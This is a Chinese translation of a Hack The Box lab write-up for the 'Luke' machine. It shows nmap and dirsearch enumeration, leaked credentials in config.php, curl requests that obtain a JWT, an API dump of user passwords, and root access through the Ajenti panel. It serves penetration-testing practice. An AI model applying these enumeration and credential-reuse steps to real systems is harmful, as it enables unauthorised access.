# 黑客盒子——卢克

> 原文：<https://infosecwriteups.com/luke-hackthebox-writeup-531495c2706?source=collection_archive---------2----------------------->

这是一篇关于我如何从黑客盒子里解决卢克的文章。

[Hack the Box](http://hackthebox.eu) 是一个在线平台，你可以在这里练习渗透测试技能。

像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。

![](img/7902039a8b68d7d257208d6313da17ae.png)

https://www.hackthebox.eu/home/machines/profile/190

# 关于盒子

卢克被评为中等难度，它的操作系统是免费的。我认为它作为一个简单的盒子是可以接受的，因为它相当短而且简单。当我解决这个的时候，我忘记了这是一个中等难度的盒子，但意识到如果你不恰当地枚举，它会相当困难。此外，对我来说，与发布时的活跃机器相比，盒子所需的方法是新的，但作为所有 HTB 机器，这里有一些东西可以学习。

# #TLDR

```
**Initial foothold:** Through enumeration, found details for credentials to authenticate to get a JWT.
**Root:** Using the generated JWT to list more credentials from port 3000 and accessing Ajenti Server Admin Panel, reading root.txt and user.txt
```

# #最初的立足点

像往常一样，我运行 nmap 扫描，将其保存到我的 n nmap 目录:

```
nmap -sV -sC -oA nmap/initial 10.10.10.137
```

输出是:

```
Nmap scan report for 10.10.10.137
Host is up (0.27s latency).
Not shown: 991 closed ports
PORT      STATE    SERVICE   VERSION
21/tcp    open     ftp       vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.13.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp    open     ssh?
80/tcp    open     http      Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
1310/tcp  filtered husky
3000/tcp  open     http      Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
3003/tcp  filtered cgms
8000/tcp  open     http      Ajenti http control panel
|_http-title: Ajenti
19315/tcp filtered keyshadow
45100/tcp filtered unknown
```

开放服务有 FTP，SSH(？)，http，Node.js 和 Ajenti。我首先检查 FTP。

## 文件传送协议

![](img/cf1a8e7f364ebe78aa130cb0134774d8.png)

我找到了一个名为 for_Chihiro.txt 的文件。我下载了它并阅读了它的内容:

```
Dear Chihiro !!As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !Derry
```

这似乎是德里写给千寻的一封短信，暗示他/她可以访问该网站的资源，但该访问权限将很快被删除。我接下来检查 HTTP。

## 超文本传送协议

![](img/6a39f84990f4dd1b706808eb2dfcccec.png)

登陆页面给了我们一个网站模板。玩了一下，发现网站里没什么好玩的。由于没有不使用暴力的标志或警告，我运行了 dirsearch。

```
dirsearch.py -u [http://10.10.10.137](http://10.10.10.137) -e php
```

![](img/a3387656b78448f1bf415e42431472fe.png)

Dirsearch 是一个 python 工具，可以暴力破解网站中的目录和文件。你可以在这里找到它，因为如果我没记错的话，它不是预先安装在 Kali 中的。

【https://github.com/maurosoria/dirsearch 

检查找到的路径:

## config.php

```
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

这看起来像是一个可能是故意的错误。它为我们提供了可能的数据库凭证的信息。

## /login.php

这为我们提供了一个登录页面。

![](img/6b1daebc0d3fa29e22bc2df50774ef49.png)

尝试 config.php 中的凭据:

![](img/abdf306ce6f3ce1b8c1eddc413573aa1.png)

## /管理

好像有管理页面。config.php 的国书对此也不起作用。

![](img/5d259c139dbb56ccf410651b4b0c5f95.png)

## 端口 8000(阿让蒂)

最后一个开放的服务是 Ajenti。凭证在这上面也不起作用。

![](img/f715d6845c0e722ea1b98406961c70f8.png)

## 端口 3000(Node.js)

访问 3000 端口时，我发现:

![](img/67d732d2101d734663dbcb07e20b8309.png)

它似乎需要我们的一个认证令牌。记得刚解这个盒子的时候，我花了很长时间去理解如何与 Node.js 交互，我在 3000 端口运行 dirsearch.py 进一步枚举。

```
dirsearch.py -u [http://10.10.10.137:3000](http://10.10.10.137:3000) -e json
```

![](img/f2b0c2ef6b5ec10b43839e7a5829b96a.png)

我找到了/users/admin 路径。需要注意的是，来自 config.php 的凭据的用户名是 root，而不是 admin。因为它要求我们 JWT 认证，我然后搜索如何做。

## 鉴定

为了访问 json 数据，我们首先需要通过获取有效的 JWT(json web 令牌)进行身份验证。你可以在这里了解它是如何运作的:[https://jwt.io/](https://jwt.io/)。我们可以使用 cURL 通过下面的语法从我们的数据中得到一个有效的 JWT。我使用-s 表示不显示进度条，-X 表示请求方法，-H 表示标题，而 data 表示有效负载:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"root","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login)Forbidden#
```

我得到的回答是“禁止”。凭据似乎无效，或者我们没有访问此的权限。经过一段时间的思考和查看，我记得有一个/users/admin 路径。推断出一个 admin 用户是有效的，我尝试将 root 改为 admin:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) {"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxMzEwLCJleHAiOjE1Njg1Mzc3MTB9.sP-q66lsXIsSs8jhYhvM6giOVvwABmmEJYoYl054gbc"}
```

然后我得到一个“成功:真”。所以有效凭证是 **admin:Zk6heYCyv6ZE9Xcg。**

## 使用 jq

然后我使用了一个叫做 jq 的工具。它是一个让 json 输出更加“可视”和“可管理”的工具。在此阅读更多关于如何使用它的信息:

[](https://0xdf.gitlab.io/2018/12/19/jq.html) [## 你需要了解 jq

### jq 是一个很棒的工具，但是没有足够多的人知道它。如果您正在处理 json 数据，即使只是很小的数据…

0xdf.gitlab.io](https://0xdf.gitlab.io/2018/12/19/jq.html) 

使用 jq，输出将如下所示:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq {
  "success": true,
  "message": "Authentication successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNDkwLCJleHAiOjE1Njg1Mzc4OTB9.pTGePScCFa4gFXNj9Gjfc9RqZfLwMBKtGY_HyfuULa0"
}
```

过滤值“令牌”:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq '.token' "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNTQzLCJleHAiOjE1Njg1Mzc5NDN9.PQlVYZfOkIRGnBMnpb6jDeV5F9g86ttccgrApZoC_xQ"
```

然后，您可以创建一个 bash 脚本来简化它，并将其存储在一个变量中，但是在这种情况下这并不重要。

这是从终端看上去的样子:

![](img/6e751a9b47ddc13a3844d4850daf549a.png)

JWT 的有效载荷部分可以被解码。你可以进一步了解它是如何编码的，它的组成部分是什么(这是你的家庭作业)。基本上是这样并排的样子(用 jwt.io):

![](img/3647be02d6a53f1bdf3cbacc6b3a98bb.png)

现在我们有了一个有效的 JWT，访问端口 3000 会得到以下响应:

```
curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxOTg3LCJleHAiOjE1Njg1MzgzODd9.qC0H5LCBtZQCbgadv5BlAy8_AojNnMs5wY2We6pJmBI" [http://10.10.10.137:3000](http://10.10.10.137:3000) | jq{
  "message": "Welcome admin ! "
}
```

作为管理员的欢迎横幅出现。

## 枚举用户

使用 JWT 访问 10.10.10.137:3000/users 得到以下输出:

```
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]
```

## /用户/管理员

```
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
```

因为在我们之前的枚举中，存在/users/admin，所以我们可以从 json 输出中尝试/users/"name"。

## /users/derry

```
{
  "name": "Derry",
  "password": "rZ86wwLvx7jUxtch"
}
```

## /用户/尤里

```
{
  "name": "Yuri",
  "password": "bet@tester87"
}
```

## /用户/多莉

```
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}
```

我现在有很多证书可以尝试。在尝试了服务和登录页面后，只有一个对我有效。

## 使用德里信用卡:

我访问了/管理，并查看了我们的笔记(for_Chihiro.txt):

```
Dear Chihiro !!As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !Derry
```

Derry 是一名 web 管理员(也来自 json 输出)。使用 it 来访问/管理:

![](img/1162364358e9457897061cbb4b9ed7f8.png)![](img/3a488ea4b24a33f573c69aa7844b5a64.png)

我能接触到管理层。这里的新内容是 config.json 文件。

# 获取根用户(和用户):

检查 config.json，我看到一个密码，看起来对 root 用户有效。

![](img/d6ef6bb05cb904ee0c451269d0b08973.png)

```
**root:KpMasng6S5EtTy9Z**
```

访问 10.10.10.137:8000:

![](img/960d4c14dcbe2cb74946da5de13178bb.png)

因为 Ajenti 是一个用于服务器管理任务的 GUI，所以我可以研究我可以利用的功能。

![](img/eef5df4dd6bf9ad387bae01325cc2d43.png)

在工具部分，Ajenti 允许我打开一个终端。因为我验证我是否有 root 权限，所以我运行 id。我以 root 用户身份运行，因此可以读取 root.txt 和 user.txt..

![](img/97c83c493c3935f13c479546aae7266d.png)

我就是这样破解了卢克的黑盒子。在花了一些时间玩了玩我能从 shell 中做些什么之后，我发现我不能。我还了解到 http 的位置不同(在 Linux 上通常不在/var/www/html 上)，帐户密码散列存储在/etc/master.passwd 上，而不是通常的/etc/shadow 上。我也试图破解德里的密码哈希，但没有成功(只是用了 rockyou.txt)。

我希望你能从这次演练中学到一些东西。感谢阅读我的文章！干杯！🍺

*关注* [*Infosec 报道*](https://medium.com/bugbountywriteup) *获取更多此类精彩报道。*

[](https://medium.com/bugbountywriteup) [## 信息安全报道

### 收集了世界上最好的黑客的文章，主题从 bug 奖金和 CTF 到 vulnhub…

medium.com](https://medium.com/bugbountywriteup)